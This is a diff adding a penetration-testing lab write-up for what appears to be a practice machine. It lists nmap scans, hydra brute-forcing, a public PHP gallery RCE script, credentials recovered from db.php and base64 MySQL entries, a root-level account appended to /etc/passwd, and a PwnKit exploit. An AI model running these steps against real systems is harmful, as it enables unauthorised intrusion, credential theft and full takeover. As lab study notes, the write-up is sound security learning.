@@ -1,0 +1,133 @@
+### Enumeration
+```
+IP=192.168.214.58
+sudo nmap -sU $IP
+sudo nmap -p- -vv $IP
+sudo nmap -p21,22,80,111,139,445,3306 -A $IP
+```
+### Ports 
+- 21
+	- vsftpd 3.0.2
+- 22
+	- OpenSSH 7.4 (protocol 2.0)
+- 80
+	- Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+- 111
+	- RPC
+- 139
+	- Samba smbd 3.X - 4.X
+- 445
+	- Samba smbd 4.10.4
+- 3306
+	- MySQL (unauthorized)
+### Foothold
+- 21
+	- ftp anonymous@$IP
+		- Successful login
+		- ![[Pasted image 20240708133530.png]]
+	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
+- RPC/ SMB
+	- enum4linux -U $IP
+		- didn't find anything
+- 445
+	- smbclient -N -L //$IP
+		- anonymous login successful
+		- shares
+			- print$
+			- IPC$
+	- nmap --script smb-vuln* -p135,139,445 $IP
+- 3306
+	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt mysql://$IP`
+- 80
+	- ![[Pasted image 20240708133832.png]]
+	- Version
+		- Simple PHP Photo Gallery v0.8
+			- Google
+				- PHP Photo Album 0.8b - 'preview' Local File Inclusion  -  exploitdb 7786
+				- 0.7 RCE
+					- https://github.com/beauknowstech/SimplePHPGal-RCE.py
+					- python3 SimplePHPGal-RCE.py http://$IP/ 192.168.45.195 21
+					- Now we have RCE
+	- Directory Brute force
+		- dirsearch -u http://$IP
+			- `db.php  /images  /js  /license.txt  /README.txt`
+		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
+### PE
+#### Linux
+- apache
+	- id
+		- uid=48(apache) gid=48(apache) groups=48(apache)
+	- sudo -l
+		- needs password
+	- uname -a
+		- Linux snookums 3.10.0-1127.10.1.el7.x86_64 #1 SMP Wed Jun 3 14:28:03 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+	- getcap -r / 2>/dev/null
+		- ![[Pasted image 20240708134928.png]]
+	- suid
+		- find / -type f -perm -04000 -ls 2>/dev/null
+			- nothing
+	- Users with console
+		- michael
+	- linpeas
+		- possible exploits
+			- dirtycow
+			- pwnkit
+		- /var/www/html/db.php
+			- user: root
+			- password: MalapropDoffUtilize1337
+	- su root
+		- MalapropDoffUtilize1337
+			- failed
+	- mysql -u root -p
+		- MalapropDoffUtilize1337
+			- Successful login
+		- databases
+			- simplephpgal
+				- users
+					- josh:VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0=
+						- MobilizeHissSeedtime747
+					- michael:U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==
+						- `echo 'U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==' | base64 -d`
+							- `SG9ja1N5ZG5leUNlcnRpZnkxMjM=`
+							- `echo 'SG9ja1N5ZG5leUNlcnRpZnkxMjM=' | base64 -d`
+								- HockSydneyCertify123
+								- su michael
+									- HockSydneyCertify123
+									- succssful
+					- serena:VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==
+						- OverallCrestLean000
+			- information_schema
+			- mysql
+			- performance_schema
+			- sys
+- michael
+	- id
+		- uid=1000(michael) gid=1000(michael) groups=1000(michael)
+	- sudo -l
+		- can't run sudo
+	- getcap -r / 2>/dev/null
+		- same as www-data
+	- suid
+		- find / -type f -perm -04000 -ls 2>/dev/null
+			- same as www-data
+	- linpeas
+		- -rw-r--r--. 1 michael root 1162 Jun 22  2021 /etc/passwd
+			- ![[Pasted image 20240708142210.png]]
+			- `echo 'root2:$1$3.pqoypX$fqH2guM82wDYRfKgvUAcK/:0:0:root:/root:/bin/bash' >> /etc/passwd`
+			- su root2
+				- password
+				- now we are rooted
+- Alt route
+	- linpeas
+		- Sudo version 1.8.23
+			- CVE-2021-4034
+			- https://github.com/joeammond/CVE-2021-4034
+			- move CVE-2021-4034.py to targer
+			- python CVE-2021-4034.py
+			- rooted
+			- ![[Pasted image 20240708143006.png]]
+### Credentials
+- michael:HockSydneyCertify123
+- serena:OverallCrestLean000
+- josh:MobilizeHissSeedtime747
+### Lessons Learned
